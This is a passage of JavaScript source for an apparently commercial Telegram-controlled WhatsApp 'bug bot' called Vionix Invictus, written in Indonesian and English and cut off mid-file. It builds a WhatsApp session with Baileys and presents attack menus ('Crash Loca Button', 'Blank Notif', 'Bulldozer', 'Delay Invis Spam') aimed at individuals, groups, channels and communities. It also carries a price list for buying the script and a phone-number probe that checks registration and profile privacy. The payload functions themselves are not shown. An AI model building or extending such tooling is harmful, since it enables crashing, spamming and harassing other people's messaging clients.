////////////////END TOOLS ANTI BIPEES////////////////
const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const fetch = require("node-fetch");
const JsConfuser = require("js-confuser");
const readline = require('readline');
const vm = require('vm');
const { spawn } = require('child_process');
const os = require("os");
const { BOT_TOKEN, OWNER_IDS } = require("./Settings.js");
const crypto = require("crypto");
const verifiedUsers = new Set();
const OTP_CODE = "v";
const groupMembers = {};
const sessionPath = './session';
let bots = [];
let daftarBotAnak = {}; 
const bot = new Telegraf(BOT_TOKEN);
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

// === Path File ===
const premiumFile = "./Database/premiums.json";
const adminFile = "./Database/admins.json";

// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
  }
  next();
};
// ===== FUNCTION CEK ADMIN GB =====
async function isAdmin(ctx) {
    const member = await ctx.getChatMember(ctx.from.id);
    return ["administrator", "creator"].includes(member.status);
}
// === Fungsi Loading Menu ===
async function LoadingViper(ctx) {
    const frames = [
        "🛸 𝐕𝐈𝐎𝐍𝐈𝐗 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟑𝟖",
    "💎 ▯▯▯▯▯▯▯▯▯▯▯▯▯▯▯ 𝟎%",
    "💎 ▮▮▯▯▯▯▯▯▯▯▯▯▯▯▯ 𝟏𝟐%",
    "💎 ▮▮▮▮▯▯▯▯▯▯▯▯▯▯▯ 𝟐𝟗%",
    "🧪 ▮▮▮▮▮▮▮▯▯▯▯▯▯▯▯ 𝟓𝟏%",
    "🧪 ▮▮▮▮▮▮▮▮▮▮▯▯▯▯▯ 𝟕𝟖%",
    "☄️ ▮▮▮▮▮▮▮▮▮▮▮▮▮▯▯ 𝟗𝟒%",
    "☄️ ▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮ 𝟏𝟎𝟎%",
    "✨ 𝐃𝐄𝐏𝐋𝐎𝐘𝐌𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒"
    ];

    // Kirim pesan awal
    const msg = await ctx.reply(frames[0]);

    // Loop untuk animasi
    for (let i = 1; i < frames.length; i++) {
        await new Promise(res => setTimeout(res, 500)); // delay 500ms
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            null,
            frames[i]
        ).catch(() => {});
    }

    // Hapus pesan setelah selesai loading
    await ctx.deleteMessage(msg.message_id).catch(() => {});

    return msg.message_id;
}
async function ultraRealChecker(sock, number) {
    try {
        const clean = number.replace(/[^0-9]/g, "");
        const jid = clean + "@s.whatsapp.net";

        // 1️⃣ cek terdaftar
        const reg = await sock.onWhatsApp(jid);

        if (!reg || reg.length === 0) {
            return {
                status: "❌ NOT REGISTERED",
                banned: "—",
                business: "—",
                verified: "—",
                note: "Nomor tidak ada di WhatsApp"
            };
        }

        // 2️⃣ cek business info
        let business = "Personal";
        let verified = "Unknown";

        try {
            const biz = await sock.getBusinessProfile(jid);

            if (biz) {
                business = "Business Account";
                // estimasi verified (tidak resmi)
                if (biz.description || biz.website) {
                    verified = "Possible Verified 🟢";
                }
            }
        } catch {}

        // 3️⃣ cek profile picture (indikasi akun aktif)
        let privacy = "PRIVATE";
        try {
            await sock.profilePictureUrl(jid, "image");
            privacy = "OPEN";
        } catch {}

        return {
            status: "✅ REGISTERED",
            banned: "Not detected",
            business,
            verified,
            privacy,
            note: "Akun aktif (indikasi normal)"
        };

    } catch {
        return {
            status: "⚠️ UNKNOWN",
            banned: "Possible restricted",
            business: "?",
            verified: "?",
            privacy: "?",
            note: "Server menolak request (indikasi limit/restricted)"
        };
    }
}
// === Fungsi Admin / Premium ===
const addAdmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addPremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());

let tokenValidated = true; // volatile gate: require token each restart

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
// ==== GLOBAL LOCK: block everything until tokenValidated === true ====
function getSnippet(lines, line, range = 2) {
  const start = Math.max(0, line - range - 1)
  const end = Math.min(lines.length - 1, line + range - 1)
  let out = []

  for (let i = start; i <= end; i++) {
    const mark = i + 1 === line ? "👉" : "  "
    out.push(`${mark} ${i + 1} | ${lines[i]}`)
  }
  return out.join("\n")
}
// ===== HTML ANALISIS ERROR PADA CEKFUNC=====
const escapeHTML = (str) =>
  str.replace(/[&<>]/g, (m) => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;'
  }[m]));
// ===== GTW LOADING INI BUAT APA =====
async function progress(ctx) {
  const steps = [
    "▰▱▱▱▱▱▱▱▱▱ 10%",
    "▰▰▱▱▱▱▱▱▱▱ 20%",
    "▰▰▰▱▱▱▱▱▱▱ 30%",
    "▰▰▰▰▱▱▱▱▱▱ 40%",
    "▰▰▰▰▰▱▱▱▱▱ 50%",
    "▰▰▰▰▰▰▱▱▱▱ 60%",
    "▰▰▰▰▰▰▰▱▱▱ 70%",
    "▰▰▰▰▰▰▰▰▱▱ 80%",
    "▰▰▰▰▰▰▰▰▰▱ 90%",
    "▰▰▰▰▰▰▰▰▰▰ 100%"
  ]

  let msg = await ctx.reply(
    "📝 Sedang Memuat Menu...\n```▱▱▱▱▱▱▱▱▱▱ 0%```",
    { parse_mode: "Markdown" }
  )

  for (const bar of steps) {
    await new Promise(r => setTimeout(r, 300))
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
      `🔎 Verification Start, Wait...\n\`\`\`${bar}\`\`\``,
      { parse_mode: "Markdown" }
    )
  }
}

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomimage = [
"https://k.top4top.io/p_37166q8y51.jpg"
];

const getRandomImage = () =>
  randomimage[Math.floor(Math.random() * randomimage.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

function startBot() {
  console.clear();
  console.log(chalk.bold.yellow(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀ ██╗   ██╗██╗ ██████╗ ███╗   ██╗██╗██╗  ██╗
  ██║   ██║██║██╔═══██╗████╗  ██║██║╚██╗██╔╝
  ██║   ██║██║██║   ██║██╔██╗ ██║██║ ╚███╔╝ 
  ╚██╗ ██╔╝██║██║   ██║██║╚██╗██║██║ ██╔██╗ 
   ╚████╔╝ ██║╚██████╔╝██║ ╚████║██║██╔╝ ██╗
    ╚═══╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝    
      `));
  console.log(
    chalk.bold.green(`
[!] System: VIONIX INVICTUS READY
───────────────────────────
© V I O N I X - I N V I C T U S
`));
}

// WhatsApp Connection
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'P', // Placeholder default
    }),
  };

  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      sock.newsletterFollow("120363404346089748@newsletter");
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯`));

      if (shouldReconnect) {
        console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Menyambung kembali...')}
╰─────────────────────────────╯`));
        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
❌ WhatsApp Belum terhubung
`);
return;
}
next();
};

////=========MENU UTAMA========\\\\
bot.command("password", (ctx) => {
  const chatId = ctx.chat.id;
  const args = ctx.message.text.split(" ").slice(1);
  const userOtp = args.join(" ");
  
  if (!userOtp) return ctx.reply("❌ Enter The Password");

  if (userOtp !== OTP_CODE)
    return ctx.reply("❌ Invalid Password.");
  
  verifiedUsers.add(chatId);
  ctx.reply("✅ Verification Successful. Access Granted. Please Type /start Again.");
});

bot.command("start", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
    
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  await LoadingViper(ctx);
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user
      ? "On Boss"
      : "Ga On Jir"; 
      
  const mainMenuMessage = `<blockquote><strong>⏤ ( 🍂 ) — こんにちは ${Name}!</strong></blockquote>
<blockquote><strong>自己紹介させてください。私は Vionix Invictus 38.0.0 – Limited Edition です現在、次世代システムとして正式リリースされていますこれは最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ @Raffioffci2 あなたが求めていた “力” です</strong></blockquote>
<blockquote><strong>⏤ 𝖳𝗁𝖾 𝖡𝗈𝗍 Ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 » @Raffioffci2
⫹⫺ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 » Vionix Invictus
⫹⫺ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 » 38.0.0 • Limited Edition
⫹⫺ 𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 » JavaScript
⫹⫺ 𝗙𝗿𝗮𝗺𝗲𝘄𝗼𝗿𝗸 » Telegraf.Js
⫹⫺ 𝗦𝘁𝗮𝘁𝘂𝘀 » Online
<blockquote><strong>⏤ 𝖲𝗍𝖺𝗍𝗎𝗌 𝖡𝗈𝗍𝗌 ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 » ${Name}
⫹⫺ 𝗦𝗲𝗻𝗱𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀 » ${waStatus}
⫹⫺ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 » ${waktuRunPanel}
⫹⫺ 𝗗𝗮𝘁𝗲 » ${new Date().toLocaleDateString()}
⫹⫺ 𝗥𝗼𝗹𝗲 𝗨𝘀𝗲𝗿𝘀 ${isPremium ? "👑 Premium User" : "💸 Free User"}
⫹⫺ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 » Limited Access Enabled
⫹⫺ 𝗘𝗱𝗶𝘁𝗶𝗼𝗻 » Official Release
<blockquote><strong>( Ϟ ) Please select a button menu below!!!</strong></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "Tʀᴀsʜ ☇ Mᴇɴᴜ",
        callback_data: "attackmenu_menu", style: "danger",
      },
      {
        text: "Mᴅ ☇ Mᴇɴᴜ",
        callback_data: "group_menu", style: "success",
      },
    ],
    [
      {
        text: "Tʜᴀɴᴋs ☇ Tᴏ",
        callback_data: "thanks_menu", style: "primary", 
      },
    ],
    [
      {
        text: "Cᴏɴᴛʀᴏʟ ☇ Mᴇɴᴜ",
        callback_data: "owner_menu", style: "danger",
      },
    ],
    [
      {
        text: "Bᴜʏ ☇ Sᴄʀɪᴘᴛ",
        callback_data: "buy_menu", style: "success",
      },      
    ],
    [
      {
        text: "Oᴡɴᴇʀ ☇ Sᴄʀɪᴘᴛ",
        url: "https://t.me/Raffioffci2", style: "danger",
      },      
      {
        text: "Cʜᴀɴɴᴇʟ ☇ Oᴡɴᴇʀ",
        url: "https://t.me/kayzoreal", style: "primary", 
      },
    ],
    [
      {
        text: "➕ Aᴅᴅ ☇ Bᴏᴛ ",
        url: "https://t.me/sennjboaddbot?startgroup=false", style:"success",      },           
    ],
  ];
  
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

bot.action("attackmenu_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
    
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user
      ? "On Boss"
      : "Ga On Jir"; 
      
  const mainMenuMessage = `<blockquote><strong>⏤ ( 🍂 ) — こんにちは ${Name}!</strong></blockquote>
<blockquote><strong>自己紹介させてください。私は Vionix Invictus 38.0.0 – Limited Edition です現在、次世代システムとして正式リリースされていますこれは最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ @Raffioffci2 あなたが求めていた “力” です</strong></blockquote>
<blockquote><strong>⏤ 𝖳𝗁𝖾 𝖡𝗈𝗍 Ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 » @Raffioffci2
⫹⫺ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 » Vionix Invictus
⫹⫺ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 » 38.0.0 • Limited Edition
⫹⫺ 𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 » JavaScript
⫹⫺ 𝗙𝗿𝗮𝗺𝗲𝘄𝗼𝗿𝗸 » Telegraf.Js
⫹⫺ 𝗦𝘁𝗮𝘁𝘂𝘀 » Online
<blockquote><strong>⏤ 𝖲𝗍𝖺𝗍𝗎𝗌 𝖡𝗈𝗍𝗌 ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 » ${Name}
⫹⫺ 𝗦𝗲𝗻𝗱𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀 » ${waStatus}
⫹⫺ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 » ${waktuRunPanel}
⫹⫺ 𝗗𝗮𝘁𝗲 » ${new Date().toLocaleDateString()}
⫹⫺ 𝗥𝗼𝗹𝗲 𝗨𝘀𝗲𝗿𝘀 ${isPremium ? "👑 Premium User" : "💸 Free User"}
⫹⫺ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 » Limited Access Enabled
⫹⫺ 𝗘𝗱𝗶𝘁𝗶𝗼𝗻 » Official Release
<blockquote><strong>( Ϟ ) Please select a button menu below!!!</strong></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "Aᴛᴛᴀᴄᴋ V1 ☇ Mᴇɴᴜ",
        callback_data: "bug_menu", style: "primary",
      },
      {
        text: "Aᴛᴛᴀᴄᴋ V2 ☇ Mᴇɴᴜ",
        callback_data: "bug_menu2", style: "success",
      },
    ],
    [
      {
        text: "Uɪ ☇ Mᴇɴᴜ",
        callback_data: "ui_menu", style: "primary",
      },
    ],
    [
      {
        text: "iOs ☇ Mᴇɴᴜ",
        callback_data: "other_menu", style: "success",
      },    
      {
        text: "Sᴘᴇᴄɪᴀʟ ☇ Mᴇɴᴜ",
        callback_data: "jmbud_menu", style: "danger",
      },    
    ],
    [
      {
        text: "Sᴇᴄʀᴇᴛ ☇ Mᴇɴᴜ",
        callback_data: "plerr_menu", style: "success",
      },                       
    ],
    [
      {
        text: "Aᴛᴛᴀᴄᴋ Gʙ ☇ Mᴇɴᴜ",
        callback_data: "grup_menu", style: "primary",
      },              
      {
        text: "Aᴛᴛᴀᴄᴋ Cʜ ☇ Mᴇɴᴜ",
        callback_data: "bukceha_menu", style: "success",
      },
    ],
    [
      {
        text: "Aᴛᴛᴀᴄᴋ Cᴏᴍᴜ ☇ Mᴇɴᴜ",
        callback_data: "comu_menu", style: "primary",
      },
    ],
    [
      {
        text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ",
        callback_data: "back", style: "danger",                    
      },                       
    ],
  ];
  
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

bot.action("group_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
    
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user
      ? "On Boss"
      : "Ga On Jir"; 
      
  const mainMenuMessage = `<blockquote><strong>⏤ ( 🍂 ) — こんにちは ${Name}!</strong></blockquote>
<blockquote><strong>自己紹介させてください。私は Vionix Invictus 38.0.0 – Limited Edition です現在、次世代システムとして正式リリースされていますこれは最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ @Raffioffci2 あなたが求めていた “力” です</strong></blockquote>
<blockquote><strong>⏤ 𝖳𝗁𝖾 𝖡𝗈𝗍 Ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 » @Raffioffci2
⫹⫺ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 » Vionix Invictus
⫹⫺ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 » 38.0.0 • Limited Edition
⫹⫺ 𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 » JavaScript
⫹⫺ 𝗙𝗿𝗮𝗺𝗲𝘄𝗼𝗿𝗸 » Telegraf.Js
⫹⫺ 𝗦𝘁𝗮𝘁𝘂𝘀 » Online
<blockquote><strong>⏤ 𝖲𝗍𝖺𝗍𝗎𝗌 𝖡𝗈𝗍𝗌 ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 » ${Name}
⫹⫺ 𝗦𝗲𝗻𝗱𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀 » ${waStatus}
⫹⫺ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 » ${waktuRunPanel}
⫹⫺ 𝗗𝗮𝘁𝗲 » ${new Date().toLocaleDateString()}
⫹⫺ 𝗥𝗼𝗹𝗲 𝗨𝘀𝗲𝗿𝘀 ${isPremium ? "👑 Premium User" : "💸 Free User"}
⫹⫺ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 » Limited Access Enabled
⫹⫺ 𝗘𝗱𝗶𝘁𝗶𝗼𝗻 » Official Release
<blockquote><strong>( Ϟ ) Please select a button menu below!!!</strong></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "Tᴏᴏʟs ☇ Mᴇɴᴜ",
        callback_data: "tools_menu", style: "success",
      },   
      {
        text: "Nꜱꜰᴡ ☇ Mᴇɴᴜ",
        callback_data: "nsfw_menu", style: "danger",
      },         
    ],
    [
      {
        text: "Fᴜɴ ☇ Mᴇɴᴜ",
        callback_data: "fun_menu", style: "success",
      },
    ],
    [
      {
        text: "Dᴏᴡɴʟᴏᴀᴅ ☇ Mᴇɴᴜ",
        callback_data: "donlot_menu", style: "danger",
      },
    ],
    [
      {
        text: "Gʀᴏᴜᴘ ☇ Mᴇɴᴜ",
        callback_data: "md_menu", style: "success",
      },
      {
        text: "Dᴇᴘʟᴏʏ ☇ Mᴇɴᴜ",
        callback_data: "deploi_menu", style: "danger",
      },      
    ],
    [
      {
        text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ",
        callback_data: "back", style: "primary"                
      },
    ],
  ];
    
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});
bot.action("buy_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐋͢𝐢͜𝐬͡𝐭  ⍣᳟ 𝐇͢𝐚͜𝐫͡𝐠͢𝐚</strong></blockquote>
<blockquote><strong>🧬VIPER INVICTUS (FIX)🧬</strong></blockquote>
     🩸Version 7.0🩸

<blockquote><strong>‣ List Harga VTIC 💸</strong></blockquote>
•No Up: 20K
•Free Up 1X: 30k
•Permanen Up: 46K
•Reseller Vtic: 55K
•Partner Vtic: 65K
•Mods Vtic: 90K
•Owner Vtic: 110K
•Tk Vtic: 170K (GET BASE NO ENC)
﻿
<blockquote><strong>Benefit Script 🎰:</strong></blockquote>
•Menu Bug Select
•Menu Bug V1
•Menu Bug V2
•Menu Bug V3 
•Script Simple
•Bug Gb
•Bug Ch
•Bug Comu
•Md Menu
•Nsfw Menu
•Secret Bug Menu
•MultiBug Number
•Fun Menu
•Tools Menu
•All Function New
﻿
<blockquote><strong>•Total Tools? 50+</strong></blockquote>

<blockquote><strong>‣ Efek Bug V6?</strong></blockquote>
 Pv @sennsofhopee
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "back", style: "primary", }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("bug_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    
    : ctx.from.first_name || "User";
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐀͢𝐭͜𝐭͡𝐚͢𝐜͜𝐤͡ ⍣᳟ 𝐌͢𝐞͡𝐧͜𝐮</strong></blockquote>
⫹⫺ - /DelayInvisSpam ━ Delay Invis ⚜️
└‣ Delay Invis Bebas Spam 
⟣━━━━━━━━━━━━━━━━━━
⫹⫺ - /vionixlayinvis ━ Delay Invis🎭
└‣ Invisible Delay 
⫹⫺ - /xdelay ━ Delay Visible 🩸
└‣ Delay Visible Hard
⫹⫺ - /xspam ━ Invisible Delay Free Spam 🚀
└‣ Free Spam Delay Invisible
⟣━━━━━━━━━━━━━━━━━━
⫹⫺ - /locaButton ━ Crash Loca Button 🖥️
└‣ Crash Loca Clik Button
⟣━━━━━━━━━━━━━━━━━━
⫹⫺ - /blank1msg ━ Blank 1 Msg 〽️
└‣ Blank Type 1 Massage 
⫹⫺ - /blankNotif ━ Blank Notif 🦠
└‣ Blank Button Notif
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", callback_data: "attackmenu_menu", style: "danger", }],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});
bot.action("bug_menu2", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐀͢𝐭͜𝐭͡𝐚͢𝐜͜𝐤 ͡𝐕2 ⍣᳟ 𝐌͢𝐞͡𝐧͜𝐮</strong></blockquote>
⫹⫺ - /xsticker ━ Delay Sticker 🕷️
└‣ Delay Sticker New
⟣━━━━━━━━━━━━━━━━━━
⫹⫺ - /blankloca ━ Blank Loca ⚡
└‣ Blank Location New
⟣━━━━━━━━━━━━━━━━━━
⫹⫺ - /bulldozer ━ Drain Wha'tsApp 🔥
└‣ Bulldozer All What'sApp
⫹⫺ - /protocol11 ━ Protocol 11 🍭
└‣ Bulldozer Type Protocol
⟣━━━━━━━━━━━━━━━━━━
`;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };
  const keyboard = {
    inline_keyboard: [
